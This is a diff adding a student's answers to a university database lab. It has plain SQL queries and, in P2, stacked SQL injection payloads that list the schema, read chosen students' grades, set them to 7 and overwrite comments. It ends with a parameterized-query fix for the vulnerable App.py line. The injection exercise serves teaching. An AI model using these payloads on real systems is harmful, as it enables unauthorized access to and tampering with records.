@@ -1,0 +1,52 @@
+Laboratorio 6
+Integrantes:
+- Alexander Sacchetti
+- Andrés Calderón
+- Felipe Fierro
+
+P1)
+(a)
+SELECT *
+FROM transparencia
+WHERE apellido_p = 'Sapone'
+ORDER BY total;
+
+(b)
+SELECT nota
+FROM cc3201
+WHERE id = 16
+OR id = 83
+OR id = 132;
+
+(c)
+UPDATE cc3201
+  SET nota = 7
+  WHERE id = 16
+  OR id = 83
+  OR id = 132;
+
+(d)
+SELECT table_name, table_schema FROM information_schema.tables;
+
+SELECT column_name, data_type FROM information_schema.columns
+WHERE table_name='cc3201' AND table_schema='nota';
+
+P2)
+(a)
+';SELECT table_name, table_schema FROM information_schema.tables;--
+
+(b)
+';SELECT column_name, data_type FROM information_schema.columns WHERE table_name='cc3201' AND table_schema='nota';--
+
+(c)
+';SELECT nota FROM nota.cc3201 WHERE id = 16 OR id = 83 OR id = 132;--
+
+(d)
+';UPDATE nota.cc3201 SET nota = 7 WHERE id = 16 OR id = 83 OR id = 132;--
+
+(e)
+';UPDATE nota.cc3201 SET comentario = 'awa' WHERE id = 16; UPDATE nota.cc3201 SET comentario = 'de' WHERE id = 83; UPDATE nota.cc3201 SET comentario = 'uwu' WHERE id = 132;--
+
+(f)
+Hay que cambiar la línea 30 de App.py por el siguiente código:
+cur.execute("SELECT nombres, apellido_p, apellido_m, mes, anho, total FROM uchile.transparencia WHERE apellido_p=%s ORDER BY total DESC LIMIT 250", [input])
